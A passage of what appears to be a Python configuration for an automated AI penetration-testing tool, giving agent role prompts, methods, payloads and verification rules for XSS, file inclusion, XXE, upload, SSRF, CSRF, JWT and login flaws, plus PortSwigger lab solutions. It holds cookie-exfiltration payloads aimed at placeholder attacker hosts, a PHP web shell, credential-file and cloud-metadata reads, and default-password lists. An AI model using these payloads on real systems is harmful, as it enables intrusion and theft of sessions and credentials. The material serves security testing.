        "verification_criteria": "CONFIRMED only if: JavaScript executes (alert fires, DOM modified, cookie accessed), OR unencoded script/event handler appears in HTML source in executable context. Encoded output (&lt;script&gt;) is NOT a finding.",
        "exploitation_guidance": "Demonstrate: document.domain alert, cookie theft via document.cookie, DOM manipulation. Provide working URL with payload.",
        "false_positive_indicators": "Output is HTML-encoded. CSP blocks script execution. Reflection is in non-executable context (HTML comment, textarea). WAF blocks payload.",
        "technology_hints": {"php": "Check echo $_GET without htmlspecialchars()", "aspnet": "Check Response.Write without AntiXSS", "node": "Check res.send() with user input, missing helmet"}
    },

    "xss_stored": {
        "role": "You are a stored/persistent XSS specialist with deep expertise in PortSwigger-level challenges and CTF labs.",
        "detection_strategy": (
            "Two-phase approach: "
            "Phase 1 - INJECT: Submit XSS payloads via comment forms, profile fields, message inputs, feedback forms, or any storage mechanism. "
            "Phase 2 - VERIFY: Navigate to the page that DISPLAYS the stored content (often different from the submission URL). "
            "Check if the payload renders unescaped and executes JavaScript. "
            "The display page URL is often the same page (blog post with comments) or a parent page."
        ),
        "test_methodology": (
            "1. RECON: Identify storage points - comment forms (look for textarea, input[name=comment]), profile editors, message systems, feedback forms. "
            "PortSwigger labs typically have comment forms on /post?postId=N with fields: comment, name, email, website. "
            "2. PROBE: Send unique harmless string (e.g., 'xsstest12345') to each text input field via POST. "
            "3. FIND DISPLAY: Navigate to pages that display stored content: same page, parent page (/post?postId=N), user profiles, comment lists. "
            "Search for your probe string in HTML source. Note the surrounding context. "
            "4. CONTEXT ANALYSIS: Determine injection context around your probe: "
            "- HTML body: use <script>alert(1)</script> or <img src=x onerror=alert(1)> "
            "- Tag attribute: use \" onfocus=alert(1) autofocus x=\" to break out "
            "- JavaScript string: use ';alert(1)// or </script><script>alert(1)</script> "
            "- href attribute: use javascript:alert(1) "
            "- Inside <textarea>: use </textarea><script>alert(1)</script> "
            "5. PAYLOAD DELIVERY: Submit context-appropriate payload to the storage endpoint via POST. "
            "Fill ALL required fields (name, email, etc.) with valid-looking data to avoid validation rejection. "
            "6. VERIFY: Navigate to display page, check HTML source for unescaped payload. "
            "7. FILTER BYPASS: If basic payload is filtered, try: "
            "- Event handlers: onload, onerror, onfocus+autofocus, onmouseover, ontoggle, onbegin "
            "- Different tags: <svg>, <details>, <input>, <body>, <iframe>, <math>, <xss> (custom) "
            "- Encoding: HTML entities (&#60;), unicode (\\u003c), hex (\\x3c), double encoding "
            "- Case mixing: <ScRiPt>, <SVG ONLOAD=alert(1)> "
            "- WAF bypass: alert`1`, window['alert'](1), eval(atob('YWxlcnQoMSk=')) "
            "8. CONFIRM: Payload MUST be verified on the DISPLAY page, not the submission response."
        ),
        "payload_selection": (
            "Context-dependent selection: "
            "HTML body: <script>alert(document.domain)</script> <img src=x onerror=alert(1)> <svg/onload=alert(1)> "
            "<details open ontoggle=alert(1)> <input onfocus=alert(1) autofocus> "
            "Attribute escape: \" onfocus=alert(1) autofocus x=\" '><img src=x onerror=alert(1)> "
            "JS string: ';alert(1)// </script><script>alert(1)</script> "
            "href: javascript:alert(1) "
            "Filter bypass: <img src=x onerror=alert`1`> <img src=x onerror=eval(atob('YWxlcnQoMSk='))>"
        ),
        "verification_criteria": (
            "CONFIRMED only if ALL of: "
            "1. Payload was submitted to a storage endpoint (POST form, PUT API) "
            "2. Navigated to a SEPARATE page load (refresh or different URL) that displays stored content "
            "3. Payload appears UNESCAPED in HTML source with dangerous tag/event handler "
            "4. JavaScript executes (alert/confirm/prompt fires) OR unescaped script/event-handler verified in source. "
            "Checking ONLY the submission response is NOT sufficient for stored XSS."
        ),
        "exploitation_guidance": (
            "Document: 1) Storage endpoint (URL, method, parameter name) "
            "2) Display endpoint where payload renders "
            "3) Exact payload used "
            "4) Screenshot or proof of alert/DOM manipulation "
            "5) Cookie theft PoC: <script>new Image().src='//attacker/?c='+document.cookie</script>"
        ),
        "false_positive_indicators": (
            "Payload is HTML-encoded on display (&lt;script&gt;). "
            "CSP blocks script execution. "
            "Payload stored but rendered inside <textarea> or <code> (safe context). "
            "Only the submission response checked (not the display page). "
            "Self-XSS only (payload visible only to submitter via reflected response)."
        ),
        "technology_hints": {
            "php": "Check database output without htmlspecialchars(). Common in blog comments, guestbooks.",
            "node": "Check template rendering: {{{var}}} in Handlebars, dangerouslySetInnerHTML in React, v-html in Vue.",
            "python": "Check Jinja2 {{var}} vs {{var|safe}}, |n filter in Mako.",
            "portswigger": (
                "PortSwigger labs typically: "
                "1) Have a comment form on /post?postId=N with 'comment', 'name', 'email', 'website' fields. "
                "2) Display comments on the same /post?postId=N page after submission. "
                "3) 'Congratulations' banner appears when the lab is solved (alert fires successfully). "
                "COMMON LAB PATTERNS AND SOLUTIONS: "
                "A) 'nothing encoded' → <script>alert(1)</script> in comment field. "
                "B) 'angle brackets encoded' → Input lands in attribute, use \" onfocus=alert(1) autofocus x=\" "
                "C) 'most tags and attributes blocked' → Probe tags: try <body>, <custom>, <xss>, <svg>, <animatetransform>. "
                "   Probe events: onfocus, onbegin, onresize, onanimationend, onpointerover. "
                "   Use first allowed tag+event combo: <xss autofocus tabindex=1 onfocus=alert(1)></xss> "
                "D) 'all tags blocked except custom' → <xss id=x onfocus=alert(1) tabindex=1>#x</xss> "
                "E) 'JavaScript string with angle brackets encoded' → ';alert(1)// or '-alert(1)-' "
                "F) 'JavaScript template literal' → ${alert(1)} or ${alert(document.domain)} "
                "G) 'href attribute' → javascript:alert(1) in website field "
                "H) 'innerHTML sink' → <img src=x onerror=alert(1)> (DOM XSS via innerHTML) "
                "I) 'onclick with angle brackets blocked' → &apos;-alert(1)-&apos; inside attribute "
                "J) 'CSP with script-src' → Check for Angular CDN, use ng-app + constructor chain "
                "K) 'into anchor href with double quotes encoded' → javascript:alert(1) "
                "L) 'select element with angle brackets encoded' → Try </option></select><img src=x onerror=alert(1)>"
            ),
        }
    },

    "xss_dom": {
        "role": "You are a DOM-based XSS specialist.",
        "detection_strategy": "Analyze client-side JavaScript for dangerous sinks (innerHTML, document.write, eval) that process user-controlled sources (location.hash, URL parameters, document.referrer).",
        "test_methodology": "1. Review JavaScript files for source→sink flows. 2. Test location.hash payloads: #<img src=x onerror=alert(1)>. 3. Test URL parameter reflection into DOM via JS. 4. Check document.write, innerHTML, jQuery.html() usage. 5. Test postMessage handlers.",
        "payload_selection": "#<img src=x onerror=alert(1)> javascript:alert(1) \"><img src=x onerror=alert(1)> '-alert(1)-' {{constructor.constructor('alert(1)')()}}",
        "verification_criteria": "CONFIRMED if: payload executes through client-side JS processing (DOM manipulation), NOT server reflection. Source→sink flow must be traced.",
        "exploitation_guidance": "Document the source (URL param, hash, referrer), the JS code processing it, and the sink (innerHTML, document.write). Provide PoC URL.",
        "false_positive_indicators": "Server-side reflection (not DOM XSS). DOMPurify or sanitizer in place. Sink is textContent not innerHTML. Framework auto-escaping (React).",
        "technology_hints": {"react": "Check dangerouslySetInnerHTML, ref.current.innerHTML", "angular": "Check bypassSecurityTrustHtml, [innerHTML]", "jquery": "Check .html(), .append() with user data"}
    },

    "blind_xss": {
        "role": "You are a blind XSS specialist targeting admin panels, log viewers, and backend systems.",
        "detection_strategy": "Inject XSS payloads with out-of-band callbacks into fields that may be viewed by admins or backend systems (support tickets, user-agent, referrer, form submissions).",
        "test_methodology": "1. Inject callback payload into: contact forms, feedback fields, User-Agent header, Referrer header. 2. Use external callback service to detect execution. 3. Inject into fields that admins review: support tickets, error reports, user profiles.",
        "payload_selection": "<script src=//callback.{{RANDOM_ID}}.oastify.com></script> <img src=//callback.attacker.com/{{RANDOM_ID}}> '><script>new Image().src='//attacker.com/?c='+document.cookie</script>",
        "verification_criteria": "CONFIRMED if: callback received from target's backend/admin panel (different IP than testing client), indicating payload executed in admin context.",
        "exploitation_guidance": "Document callback received, source IP (should be target server/admin), and cookie/data exfiltrated. Admin session hijack is the primary impact.",
        "false_positive_indicators": "Callback from own browser (self-XSS). Payload stored but never rendered. Admin panel uses CSP blocking external scripts.",
        "technology_hints": {"general": "Target: admin panels, log viewers, email clients, monitoring dashboards, helpdesk systems"}
    },

    "mutation_xss": {
        "role": "You are a mutation XSS (mXSS) specialist.",
        "detection_strategy": "Exploit browser HTML parsing quirks where sanitized HTML mutates into executable code after DOM serialization/deserialization.",
        "test_methodology": "1. Test HTML that mutates through innerHTML assignment: <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>. 2. Test noscript-based mutations. 3. Test namespace confusion between SVG/MathML and HTML. 4. Check DOMPurify version for known bypasses.",
        "payload_selection": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)> <svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\"> <noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "verification_criteria": "CONFIRMED if: payload executes after browser re-parses/mutates the sanitized HTML. Must demonstrate the mutation (before/after innerHTML).",
        "exploitation_guidance": "Document the sanitizer used, the mutation chain, and execution proof. This bypasses server-side and client-side sanitization.",
        "false_positive_indicators": "Sanitizer blocks the payload. No innerHTML re-parsing occurs. Browser version doesn't exhibit the mutation.",
        "technology_hints": {"general": "Target DOMPurify < 2.x, Closure Sanitizer, Angular sanitizer. Browser-specific mutations in Chrome vs Firefox."}
    },

    "xss_filter_bypass": {
        "role": "You are an expert XSS filter bypass researcher. Given a target's filter map (allowed/blocked chars, tags, events), you generate custom payloads that bypass the specific filters.",
        "detection_strategy": (
            "Analyze the filter map to understand exactly what is blocked vs allowed. "
            "Then craft payloads using ONLY allowed elements. Key strategies: "
            "1) If common tags blocked, use custom/unusual tags: <xss>, <custom>, <animatetransform>, <set>, <animate>, <math>, <details> "
            "2) If common events blocked, use uncommon events: onbegin, onanimationend, onpointerover, onfocusin, ontransitionend "
            "3) If alert() blocked, use alternatives: confirm(), prompt(), print(), alert`1`, eval(atob(...)), Function('alert(1)')() "
            "4) If parentheses blocked, use: backticks alert`1`, throw/onerror, eval(atob('YWxlcnQoMSk=')) with `` "
            "5) If angle brackets blocked, break out of attribute context with event handlers "
            "6) If quotes blocked, use unquoted attributes or backticks "
            "7) For CSP bypass: Angular CDN + ng-app, base tag injection, JSONP endpoints"
        ),
        "test_methodology": (
            "Given a filter map, generate 10 custom XSS payloads that: "
            "1. Use ONLY tags from the allowed_tags list (or custom tags if no common tags allowed) "
            "2. Use ONLY events from the allowed_events list (or uncommon events if no common ones allowed) "
            "3. Use ONLY characters from the allowed_chars list "
            "4. Attempt encoding bypasses for blocked characters "
            "5. Try alert alternatives if alert is blocked "
            "Return payloads as a JSON array of strings."
        ),
        "payload_selection": (
            "Tier 1 - Direct: Use allowed tag + allowed event + alert(1) "
            "Tier 2 - Encoding: HTML entities for blocked chars, unicode escapes, hex encoding "
            "Tier 3 - Alt functions: confirm(1), prompt(1), print(), eval(atob('YWxlcnQoMSk=')) "
            "Tier 4 - Context breakout: attribute escape, JS string break, template literal injection "
            "Tier 5 - Polyglots: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//..."
        ),
        "verification_criteria": "CONFIRMED if any generated payload achieves JavaScript execution (alert/confirm/prompt fires or DOM is modified).",
        "exploitation_guidance": "Document which filter was bypassed, what technique worked, and the minimal payload for reproduction.",
        "false_positive_indicators": "Payload appears in source but is in non-executable context. CSP prevents execution even though payload is injected.",
        "technology_hints": {
            "portswigger": (
                "PortSwigger filter bypass labs follow predictable patterns: "
                "1) Tag blacklist: fuzz all tags, find the 1-2 that pass through (often custom tags or SVG elements) "
                "2) Event blacklist: fuzz all events, find the 1-2 that pass through (often onbegin, onanimationend, onresize) "
                "3) WAF bypass: try encoding, case mixing, null bytes, nested tags "
                "4) The lab always has at least one working payload path"
            ),
        }
    },

    # ===== FILE ACCESS (24-31) =====

    "lfi": {
        "role": "You are a Local File Inclusion specialist.",
        "detection_strategy": "Inject path traversal sequences to include local files through file inclusion parameters (page=, file=, template=, lang=).",
        "test_methodology": "1. Identify file inclusion parameters at {{ENDPOINT}}. 2. Inject ../../etc/passwd (Linux) or ..\\..\\windows\\win.ini (Windows). 3. Try null byte: ../../etc/passwd%00. 4. Try filter wrappers: php://filter/convert.base64-encode/resource=index. 5. Try double encoding: %252e%252e%252f.",
        "payload_selection": "../../../../../../etc/passwd ....//....//etc/passwd ..\\..\\..\\windows\\win.ini php://filter/convert.base64-encode/resource=config %252e%252e%252fetc/passwd /etc/passwd%00.php",
        "verification_criteria": "CONFIRMED if: local file contents appear in response (root:x:0:0 for /etc/passwd, [fonts] for win.ini), OR base64-encoded source code returned via php://filter.",
        "exploitation_guidance": "Read /etc/passwd, /etc/shadow (if accessible), application config files, source code. Try escalation to RCE via log poisoning or /proc/self/environ.",
        "false_positive_indicators": "Path traversal stripped, only filename used. 404 or generic error. WAF blocks ../ patterns. File exists but returns normal page.",
        "technology_hints": {"php": "include/require with user input, php://filter wrappers, expect:// wrapper", "java": "FileInputStream, ClassLoader.getResource with user input", "node": "fs.readFile, path.join with user input"}
    },

    "rfi": {
        "role": "You are a Remote File Inclusion specialist.",
        "detection_strategy": "Inject remote URLs into file inclusion parameters to include and execute attacker-controlled files from external servers.",
        "test_methodology": "1. Inject http://attacker.com/shell.txt into file parameter. 2. Try different protocols: https://, ftp://, data://. 3. Check if allow_url_include is enabled (PHP). 4. Use data:// wrapper for inline code execution.",
        "payload_selection": "http://attacker.com/test.txt https://evil.com/shell.php data://text/plain,<?php phpinfo();?> data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
        "verification_criteria": "CONFIRMED if: remote file contents are included and/or executed (phpinfo output, custom marker from remote file appears in response).",
        "exploitation_guidance": "Host a test file on attacker server, demonstrate inclusion. Escalate to code execution. Document RFI endpoint and executed code.",
        "false_positive_indicators": "Remote URLs blocked by allow_url_include=Off. URL scheme stripped. Whitelist-only file paths. Network firewall blocks outbound.",
        "technology_hints": {"php": "Requires allow_url_include=On in php.ini. Test with data:// wrapper even if http:// blocked."}
    },

    "path_traversal": {
        "role": "You are a path traversal specialist targeting file read/download endpoints.",
        "detection_strategy": "Inject ../ sequences into file path parameters to read arbitrary files outside the intended directory.",
        "test_methodology": "1. Identify file download/read endpoints at {{ENDPOINT}}. 2. Inject ../../../etc/passwd. 3. Try URL encoding: %2e%2e%2f. 4. Try double encoding: %252e%252e%252f. 5. Try OS-specific: ..\\..\\windows\\win.ini.",
        "payload_selection": "../../../etc/passwd ..%2f..%2f..%2fetc/passwd %2e%2e/%2e%2e/etc/passwd ....//....//etc/passwd ..\\..\\..\\windows\\win.ini ..%5c..%5cwindows%5cwin.ini",
        "verification_criteria": "CONFIRMED if: file contents from outside intended directory appear in response. /etc/passwd contents (root:x:0:0) or win.ini ([fonts]) are definitive.",
        "exploitation_guidance": "Read sensitive files: /etc/passwd, /etc/shadow, config files, .env, database.yml. Document each file read as proof.",
        "false_positive_indicators": "Path normalized before use (realpath()). Only basename used. Chroot/jail prevents traversal.",
        "technology_hints": {"php": "file_get_contents, readfile with user path", "python": "open() with os.path.join (still vulnerable if user input starts with /)", "node": "fs.readFile with path.join"}
    },

    "xxe": {
        "role": "You are an XML External Entity injection specialist.",
        "detection_strategy": "Inject XML entity declarations referencing local files or external URLs into XML input to extract data or trigger SSRF.",
        "test_methodology": "1. Find XML input points: API endpoints, file uploads (SVG, DOCX, XLSX), SOAP services. 2. Inject: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>. 3. Try parameter entities for blind XXE. 4. Try OOB extraction via HTTP callback.",
        "payload_selection": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root> <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/{{RANDOM_ID}}'>]><root>&xxe;</root> <!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]>",
        "verification_criteria": "CONFIRMED if: local file contents appear in response (entity resolved), OR OOB callback received, OR error message contains file contents.",
        "exploitation_guidance": "Read /etc/passwd, application config. Try SSRF via http:// entity to internal services. Try billion laughs for DoS assessment. Document extracted data.",
        "false_positive_indicators": "XML parser disables external entities. DTD processing disabled. Generic XML parse error. Entity not resolved.",
        "technology_hints": {"java": "DocumentBuilderFactory without disabling external entities", "php": "simplexml_load_string, DOMDocument without LIBXML_NOENT", "python": "lxml.etree without resolve_entities=False"}
    },

    "file_upload": {
        "role": "You are a file upload vulnerability specialist.",
        "detection_strategy": "Upload malicious files (web shells, polyglots) to find unrestricted file upload that leads to code execution or stored XSS.",
        "test_methodology": "1. Upload legitimate file to understand upload flow. 2. Try uploading .php/.jsp/.aspx with web shell content. 3. Try extension bypass: .php5, .phtml, .PhP, .php.jpg. 4. Try MIME type bypass. 5. Try content-type manipulation. 6. Find upload path and access uploaded file.",
        "payload_selection": "shell.php (<?php system($_GET['cmd']);?>) shell.php.jpg (extension bypass) shell.phtml test.svg (<svg onload=alert(1)>) shell.php%00.jpg (null byte) .htaccess (AddType application/x-httpd-php .jpg)",
        "verification_criteria": "CONFIRMED if: uploaded file with malicious content is accessible and executes (web shell works, SVG XSS fires), OR stored in public directory with original extension.",
        "exploitation_guidance": "Upload web shell and demonstrate command execution. Document upload endpoint, file path, and execution proof.",
        "false_positive_indicators": "File renamed to random name. Extension stripped/changed. Content scanned and rejected. File stored outside web root.",
        "technology_hints": {"php": "move_uploaded_file without extension check, Apache AddHandler", "java": "MultipartFile without validation, JSP web shell", "aspnet": ".aspx upload to IIS"}
    },

    "arbitrary_file_read": {
        "role": "You are an arbitrary file read specialist.",
        "detection_strategy": "Exploit API endpoints or parameters that read files to access sensitive files outside intended scope. Different from LFI - targets direct file read operations, not inclusion.",
        "test_methodology": "1. Find file read endpoints (download, export, attachment). 2. Manipulate file path parameter. 3. Try absolute paths: /etc/passwd. 4. Try relative paths from app directory. 5. Target: .env, config files, source code, private keys.",
        "payload_selection": "/etc/passwd /etc/shadow ../../../.env ../../config/database.yml /proc/self/environ /proc/self/cmdline ~/.ssh/id_rsa",
        "verification_criteria": "CONFIRMED if: contents of sensitive file returned. File must be outside intended access scope.",
        "exploitation_guidance": "Read .env (API keys), database configs (credentials), SSH keys, source code. Document each sensitive file read.",
        "false_positive_indicators": "Only files within allowed directory returned. Path canonicalized. Access denied for traversal attempts.",
        "technology_hints": {"general": "Target: /etc/passwd, .env, config.yml, database.yml, wp-config.php, settings.py, .git/config"}
    },

    "arbitrary_file_delete": {
        "role": "You are an arbitrary file delete vulnerability specialist.",
        "detection_strategy": "Exploit file deletion functionality to delete arbitrary files on the server, potentially causing DoS or security bypass.",
        "test_methodology": "1. Find delete file endpoints. 2. Manipulate file path to target arbitrary files. 3. Try deleting .htaccess, web.config for security bypass. 4. Try deleting application files. 5. CAUTION: Test with non-critical files first.",
        "payload_selection": "../../../tmp/test_delete_{{RANDOM_ID}} ../.htaccess ../../.env (DON'T actually delete critical files - verify path traversal first with read)",
        "verification_criteria": "CONFIRMED if: file outside intended scope can be targeted for deletion (verify the path traversal is possible, DON'T actually delete critical files). Demonstrate with a test file you created.",
        "exploitation_guidance": "Create a test file, then delete it via the vulnerability. Document the path traversal capability. DO NOT delete actual application files.",
        "false_positive_indicators": "Deletion restricted to specific directory. Path normalized. Permission denied for files outside scope.",
        "technology_hints": {"php": "unlink() with user-controlled path", "python": "os.remove() with user input", "node": "fs.unlink() with user path"}
    },

    "zip_slip": {
        "role": "You are a Zip Slip (archive path traversal) specialist.",
        "detection_strategy": "Upload crafted ZIP/TAR archives with path traversal filenames (../../evil.php) to write files outside the extraction directory.",
        "test_methodology": "1. Create ZIP with entry named ../../tmp/zipslip_{{RANDOM_ID}}. 2. Upload to archive extraction endpoint. 3. Check if file was written to /tmp/. 4. Try writing web shell to web root.",
        "payload_selection": "Craft ZIP with entries: ../../tmp/test_{{RANDOM_ID}}.txt ../../../var/www/html/shell.php ../../../../tmp/zipslip_proof",
        "verification_criteria": "CONFIRMED if: file from archive extracted to path outside intended directory. Verify by accessing the written file.",
        "exploitation_guidance": "Write a test marker file outside extraction dir. If web root writable, demonstrate web shell deployment. Document the archive structure and written file.",
        "false_positive_indicators": "Extraction validates entry names. Path traversal stripped. Extraction to isolated temp directory.",
        "technology_hints": {"java": "ZipInputStream without entry name validation", "python": "zipfile.extractall without path checking", "node": "unzipper/adm-zip without path validation"}
    },

    # ===== REQUEST FORGERY (32-35) =====

    "ssrf": {
        "role": "You are an SSRF (Server-Side Request Forgery) specialist.",
        "detection_strategy": "Inject internal URLs and callback addresses into parameters that trigger server-side HTTP requests to access internal services.",
        "test_methodology": "1. Find URL/webhook parameters at {{ENDPOINT}}. 2. Inject http://127.0.0.1, http://localhost, http://[::1]. 3. Try internal IPs: 10.0.0.1, 172.16.0.1, 192.168.1.1. 4. Try callback to detect blind SSRF. 5. Try protocol smuggling: gopher://, file://.",
        "payload_selection": "http://127.0.0.1:80 http://localhost:8080 http://[::1] http://169.254.169.254/latest/meta-data/ http://attacker.com/{{RANDOM_ID}} file:///etc/passwd gopher://127.0.0.1:25/",
        "verification_criteria": "CONFIRMED if: internal service response returned, OR callback received from target server IP, OR cloud metadata accessed, OR local file read via file://.",
        "exploitation_guidance": "Access internal admin panels, cloud metadata (169.254.169.254), internal APIs. Port scan internal network. Document internal responses.",
        "false_positive_indicators": "URL validated against whitelist. Only HTTPS allowed. DNS resolution blocked for internal IPs. Response not returned (true blind with no callback).",
        "technology_hints": {"python": "requests.get() with user URL", "node": "axios/fetch with user URL", "java": "HttpURLConnection with user URL"}
    },

    "ssrf_cloud": {
        "role": "You are a cloud SSRF specialist targeting cloud metadata services.",
        "detection_strategy": "Exploit SSRF to access cloud metadata endpoints (AWS, GCP, Azure) to steal credentials and escalate privileges.",
        "test_methodology": "1. Test AWS: http://169.254.169.254/latest/meta-data/. 2. Test GCP: http://metadata.google.internal/computeMetadata/v1/ (with Metadata-Flavor: Google). 3. Test Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01. 4. Extract IAM credentials.",
        "payload_selection": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.169.254/latest/user-data http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "verification_criteria": "CONFIRMED if: cloud metadata returned (ami-id, instance-id, access keys), OR IAM credentials extracted.",
        "exploitation_guidance": "Extract IAM role credentials, user-data (may contain secrets), network config. Document cloud provider and extracted metadata.",
        "false_positive_indicators": "IMDSv2 requires token (PUT first). Metadata endpoint blocked by firewall. Not running in cloud environment.",
        "technology_hints": {"aws": "IMDSv1: GET directly. IMDSv2: PUT for token first.", "gcp": "Requires Metadata-Flavor: Google header", "azure": "Requires Metadata: true header"}
    },

    "csrf": {
        "role": "You are a CSRF (Cross-Site Request Forgery) specialist.",
        "detection_strategy": "Identify state-changing operations (POST/PUT/DELETE) that lack CSRF tokens, SameSite cookies, or Origin validation.",
        "test_methodology": "1. Identify state-changing endpoints (password change, email update, transfer). 2. Check for CSRF token in forms/headers. 3. Check SameSite cookie attribute. 4. Try submitting request without token. 5. Try with modified/empty token. 6. Check if Origin/Referer validated.",
        "payload_selection": "Create HTML form targeting state-changing endpoint without CSRF token. Test: empty token, deleted token parameter, token from different session, token from different page.",
        "verification_criteria": "CONFIRMED if: state-changing action succeeds from cross-origin request without valid CSRF token. The action must have security impact (not just UI changes).",
        "exploitation_guidance": "Create PoC HTML page that performs the action. Document: target endpoint, missing protection, and action performed. Focus on high-impact actions (password change, fund transfer).",
        "false_positive_indicators": "CSRF token present but not obvious (in custom header). SameSite=Strict cookie. Action requires re-authentication. Only GET requests (not state-changing).",
        "technology_hints": {"php": "Check for csrf_token in forms, Laravel @csrf", "python": "Django {% csrf_token %}, Flask-WTF", "node": "csurf middleware, SameSite cookie"}
    },

    "cors_misconfig": {
        "role": "You are a CORS misconfiguration specialist.",
        "detection_strategy": "Test Access-Control-Allow-Origin header behavior with various Origin values to identify overly permissive CORS policies.",
        "test_methodology": "1. Send request with Origin: https://evil.com. 2. Check if origin reflected in ACAO header. 3. Test with Origin: null. 4. Check Access-Control-Allow-Credentials. 5. Test origin variations: subdomain, prefix/suffix matching.",
        "payload_selection": "Origin: https://evil.com Origin: null Origin: https://target.com.evil.com Origin: https://eviltarget.com Origin: https://subdomain.target.com",
        "verification_criteria": "CONFIRMED if: arbitrary origin reflected in ACAO header, ESPECIALLY with Allow-Credentials: true. Wildcard (*) with credentials is also a finding.",
        "exploitation_guidance": "Create PoC JS that reads authenticated response cross-origin. Document: reflected origin, credentials flag, and accessible data.",
        "false_positive_indicators": "Only whitelisted origins reflected. No credentials allowed with wildcard. CORS on public, non-sensitive endpoints only.",
        "technology_hints": {"general": "Most dangerous: reflected origin + credentials. Check regex-based origin validation for bypass."}
    },

    # ===== AUTHENTICATION (36-43) =====

    "auth_bypass": {
        "role": "You are an authentication bypass specialist. You verify bypass by checking response DATA for authenticated content, not just status codes.",
        "detection_strategy": "Find ways to access authenticated resources without valid credentials. CRITICAL: A 200 status without session does NOT mean bypass — verify the response contains AUTHENTICATED content.",
        "test_methodology": (
            "1. Access endpoint WITH valid session → record response body (authenticated baseline).\n"
            "2. Access same endpoint WITHOUT session → record response body.\n"
            "3. DATA COMPARISON: Does step 2 return the SAME authenticated content as step 1?\n"
            "   - YES (user data, dashboard, admin panel) → auth bypass confirmed.\n"
            "   - NO (login page, redirect, generic page, empty body) → NOT bypassed.\n"
            "4. Try path tricks: /admin;.js, /admin%20/, /admin/., X-Original-URL: /admin.\n"
            "5. For each trick, compare response DATA with authenticated baseline."
        ),
        "payload_selection": "Direct URL access without cookies. Modified/removed Authorization header. Path tricks: /admin;.js /admin%20/ /admin/. HTTP method override: X-HTTP-Method-Override: GET X-Original-URL: /admin",
        "verification_criteria": (
            "CONFIRMED only if: response WITHOUT valid credentials contains AUTHENTICATED content "
            "(user data, admin panel, sensitive information). "
            "200 with login page, redirect, or generic content is NOT bypass."
        ),
        "exploitation_guidance": "Document exact bypass method, show side-by-side: authenticated response vs unauthenticated response, highlight matching content.",
        "false_positive_indicators": "200 returns login page (not actual authenticated content). Generic page with no sensitive data. Cached response. Redirect to login.",
        "technology_hints": {"node": "Check middleware ordering in Express", "java": "Check Spring Security filter chain", "php": "Check session_start() in all protected pages"}
    },

    "jwt_manipulation": {
        "role": "You are a JWT security specialist.",
        "detection_strategy": "Analyze and manipulate JSON Web Tokens to bypass authentication by exploiting weak signing, algorithm confusion, or missing validation.",
        "test_methodology": "1. Decode JWT payload (base64). 2. Try algorithm: none attack. 3. Try RS256→HS256 algorithm confusion. 4. Try brute-forcing weak secrets. 5. Modify claims (role, user_id) and re-sign. 6. Check for JWK/JKU header injection.",
        "payload_selection": "Algorithm none: {\"alg\":\"none\"} RS256→HS256: re-sign with public key as HMAC secret. Weak secret: try common passwords (secret, password, 123456). Claim modification: change role to admin.",
        "verification_criteria": "CONFIRMED if: modified JWT accepted by server (different user/role accessible), OR algorithm none accepted, OR weak secret allows forging.",
        "exploitation_guidance": "Forge admin JWT and access admin endpoints. Document: original JWT, modified JWT, and resulting access level change.",
        "false_positive_indicators": "JWT properly validated. Algorithm strictly enforced. Strong secret (not brute-forceable). Token expiry enforced.",
        "technology_hints": {"node": "jsonwebtoken verify() with algorithms option", "python": "PyJWT decode() without algorithms parameter", "java": "Check JJWT/Nimbus configuration"}
    },

    "session_fixation": {
        "role": "You are a session fixation specialist.",
        "detection_strategy": "Check if the application accepts externally set session IDs and fails to regenerate them after authentication.",
        "test_methodology": "1. Get a session ID before login. 2. Login with valid credentials. 3. Check if session ID changed after login. 4. If unchanged, the pre-auth session can be used to hijack post-auth session.",
        "payload_selection": "Set-Cookie: SESSIONID=attacker_controlled_value before login. Check cookie after login. Try session ID in URL parameter if supported.",
        "verification_criteria": "CONFIRMED if: pre-authentication session ID remains valid and gains authenticated privileges after user logs in.",
        "exploitation_guidance": "Document: pre-auth session ID, login step, post-auth session ID (same = vulnerable). Show authenticated access with pre-set session.",
        "false_positive_indicators": "Session regenerated on login. Session ID from different domain rejected. HttpOnly prevents JS access.",
        "technology_hints": {"php": "Check for session_regenerate_id() after login", "java": "Check for request.changeSessionId() or invalidate+create", "python": "Django: request.session.cycle_key()"}
    },

    "weak_password": {
        "role": "You are a password policy analysis specialist.",
        "detection_strategy": "Assess password policy strength by testing if weak passwords are accepted during registration or password change.",
        "test_methodology": "1. Try creating account with weak passwords: 123456, password, abc123. 2. Check minimum length enforcement. 3. Check complexity requirements (uppercase, numbers, special chars). 4. Check against known breached passwords. 5. Test password change with weak password.",
        "payload_selection": "123456 password abc123 qwerty aaaaaa 12345678 Password1 test (minimum length test)",
        "verification_criteria": "CONFIRMED if: password shorter than 8 chars accepted, OR common passwords (123456, password) accepted, OR no complexity requirements enforced.",
        "exploitation_guidance": "Document: accepted weak passwords, missing policy requirements. Show registration/change endpoint allowing weak passwords.",
        "false_positive_indicators": "Password policy enforced but not displayed to user. Client-side validation only (server accepts). Account lockout prevents testing.",
        "technology_hints": {"general": "NIST SP 800-63B recommends: min 8 chars, check against breached password lists, no arbitrary complexity rules"}
    },

    "default_credentials": {
        "role": "You are a default credential discovery specialist.",
        "detection_strategy": "Test common default username/password combinations on login pages, admin panels, and management interfaces.",
        "test_methodology": "1. Identify login endpoints and technologies. 2. Try technology-specific defaults: admin/admin, root/root, admin/password. 3. Check documentation for default credentials. 4. Test management interfaces (Tomcat, Jenkins, phpMyAdmin).",
        "payload_selection": "admin:admin admin:password root:root test:test administrator:administrator admin:admin123 user:user guest:guest admin:changeme admin:default",
        "verification_criteria": "CONFIRMED if: successful login with default credentials, gaining access to authenticated functionality.",
        "exploitation_guidance": "Document: login endpoint, default credentials used, and functionality accessible after login.",
